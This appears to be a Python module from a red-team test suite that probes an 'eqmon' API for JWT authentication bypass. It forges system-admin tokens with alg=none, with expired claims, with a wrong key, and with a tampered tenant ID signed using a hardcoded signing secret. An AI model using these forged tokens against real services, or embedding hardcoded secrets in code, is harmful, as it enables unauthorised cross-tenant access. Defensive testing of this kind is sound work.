"""Authentication bypass attacks via JWT manipulation."""

import jwt as pyjwt  # PyJWT
import time
import uuid

from redteam.base import Attack, AttackResult, Severity, Status


class AuthBypassAttack(Attack):
    name = "api.auth_bypass"
    category = "api"
    severity = Severity.CRITICAL
    description = "JWT authentication bypass via token manipulation"

    JWT_SECRET = "eqmon_jwt_secret_2026_artemis_integration"

    def _make_valid_payload(self, **overrides) -> dict:
        payload = {
            "iat": int(time.time()),
            "exp": int(time.time()) + 86400,
            "user_id": "redteam-fake-user",
            "instance_id": "default",
            "email": "fake@test.com",
            "role": "system-admin",
            "opco_id": None,
            "vessel_id": None,
            "salt_version": 1,
            "auth_source": "eqmon",
        }
        payload.update(overrides)
        return payload

    def _encode_jwt(self, payload: dict, secret: str = None, algorithm: str = "HS256") -> str:
        return pyjwt.encode(payload, secret or self.JWT_SECRET, algorithm=algorithm)

    async def execute(self, client) -> list[AttackResult]:
        results = []
        test_path = "/api/ai_chat.php"
        test_params = {"session_id": f"redteam-{uuid.uuid4().hex[:8]}"}

        # 1. No cookie at all - request without any auth
        status_code, body, headers = await client.get(test_path, params=test_params, cookies={})
        results.append(self._make_result(
            variant="no_cookie",
            status=Status.DEFENDED if status_code == 401 else Status.VULNERABLE,
            evidence=f"Status: {status_code}, Body: {body[:200]}",
            details=(
                f"Request with no auth cookie returned {status_code}"
                + (" (expected 401)" if status_code == 401 else " - SHOULD BE 401!")
            ),
            request={"path": test_path, "cookies": "none"},
            response={"status": status_code, "body": body[:200]},
        ))

        # 2. Expired JWT - create a token with exp in the past
        expired_payload = self._make_valid_payload(exp=int(time.time()) - 3600)
        expired_token = self._encode_jwt(expired_payload)
        status_code, body, headers = await client.get(
            test_path, params=test_params,
            cookies={"eqmon_session": expired_token},
        )
        results.append(self._make_result(
            variant="expired_jwt",
            status=Status.DEFENDED if status_code == 401 else Status.VULNERABLE,
            evidence=f"Status: {status_code}, Body: {body[:200]}",
            details=f"Expired JWT (exp=-1h) returned {status_code}",
            request={"token": "expired (-1h)"},
            response={"status": status_code},
        ))

        # 3. Wrong signing key - sign with "totally_wrong_secret"
        wrong_key_token = self._encode_jwt(
            self._make_valid_payload(), secret="totally_wrong_secret",
        )
        status_code, body, headers = await client.get(
            test_path, params=test_params,
            cookies={"eqmon_session": wrong_key_token},
        )
        results.append(self._make_result(
            variant="wrong_signing_key",
            status=Status.DEFENDED if status_code == 401 else Status.VULNERABLE,
            severity=Severity.CRITICAL,
            evidence=f"Status: {status_code}, Body: {body[:200]}",
            details=f"JWT signed with wrong key returned {status_code}",
            request={"token": "signed with 'totally_wrong_secret'"},
            response={"status": status_code},
        ))

        # 4. Tampered payload - valid signature but fabricated instance_id
        tampered_payload = self._make_valid_payload(instance_id="hacked_instance")
        tampered_token = self._encode_jwt(tampered_payload)
        status_code, body, headers = await client.get(
            test_path, params=test_params,
            cookies={"eqmon_session": tampered_token},
        )
        results.append(self._make_result(
            variant="tampered_instance_id",
            status=Status.VULNERABLE if status_code == 200 else Status.DEFENDED,
            severity=Severity.CRITICAL,
            evidence=f"Status: {status_code}, Body: {body[:200]}",
            details=(
                f"JWT with fabricated instance_id returned {status_code}. "
                "If 200, attacker can access arbitrary tenant data."
            ),
            request={"token": "instance_id='hacked_instance'"},
            response={"status": status_code, "body": body[:200]},
        ))

        # 5. "none" algorithm attack - JWT with alg=none
        try:
            none_token = pyjwt.encode(
                self._make_valid_payload(), "", algorithm="none",
            )
        except Exception:
            # Fallback: manually construct alg=none token
            import base64
            import json as _json
            header = base64.urlsafe_b64encode(
                _json.dumps({"alg": "none", "typ": "JWT"}).encode()
            ).rstrip(b"=").decode()
            payload_b64 = base64.urlsafe_b64encode(
                _json.dumps(self._make_valid_payload()).encode()
            ).rstrip(b"=").decode()
            none_token = f"{header}.{payload_b64}."
        status_code, body, headers = await client.get(
            test_path, params=test_params,
            cookies={"eqmon_session": none_token},
        )
        results.append(self._make_result(
            variant="none_algorithm",
            status=Status.DEFENDED if status_code == 401 else Status.VULNERABLE,
            severity=Severity.CRITICAL,
            evidence=f"Status: {status_code}, Body: {body[:200]}",
            details=f"JWT with alg=none returned {status_code}",
            request={"token": "alg=none"},
            response={"status": status_code},
        ))

        # 6. Empty cookie value - send empty eqmon_session cookie
        status_code, body, headers = await client.get(
            test_path, params=test_params,
            cookies={"eqmon_session": ""},
        )
        results.append(self._make_result(
            variant="empty_cookie",
            status=Status.DEFENDED if status_code == 401 else Status.VULNERABLE,
            evidence=f"Status: {status_code}",
            details=f"Empty cookie returned {status_code}",
            request={"token": "empty string"},
            response={"status": status_code},
        ))

        # 7. Malformed JWT - send "not.a.jwt.token" as cookie
        status_code, body, headers = await client.get(
            test_path, params=test_params,
            cookies={"eqmon_session": "not.a.valid.jwt.token"},
        )
        results.append(self._make_result(
            variant="malformed_jwt",
            status=Status.DEFENDED if status_code == 401 else Status.VULNERABLE,
            evidence=f"Status: {status_code}, Body: {body[:200]}",
            details=f"Malformed JWT returned {status_code}",
            request={"token": "not.a.valid.jwt.token"},
            response={"status": status_code},
        ))

        return results
